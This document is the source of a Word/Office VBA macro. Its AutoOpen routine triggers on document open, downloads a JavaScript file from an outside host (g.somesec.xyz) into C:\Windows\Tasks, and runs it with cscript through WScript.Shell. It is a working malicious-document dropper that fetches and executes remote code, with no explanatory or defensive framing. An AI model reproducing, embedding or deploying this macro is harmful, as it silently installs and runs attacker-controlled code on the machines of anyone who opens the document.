Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub Execute()
    Dim ret
    Dim o
    Set ret = VBA.CreateObject("WScript.Shell")
    o = ret.Run("cscript c:\\windows\\tasks\\main.js")
End Sub

Sub RemoteFetch()
    filepath = "c:\\windows\\tasks\\main.js"
    URL = "http://g.somesec.xyz/js/main.js"
    
    Set xhr = CreateObject("Msxml2.ServerXMLHTTP.6.0")
    With xhr
        .Open "GET", URL, False
        .Send
    End With
    Wait (2)
    If xhr.Status = 200 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filepath) Then fso.DeleteFile (filepath)
        
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write (xhr.ResponseBody)
        stream.Position = 0
        stream.SaveToFile (filepath)
        stream.Close
        
        Execute
    End If
End Sub

Sub AutoOpen()
    RemoteFetch
End Sub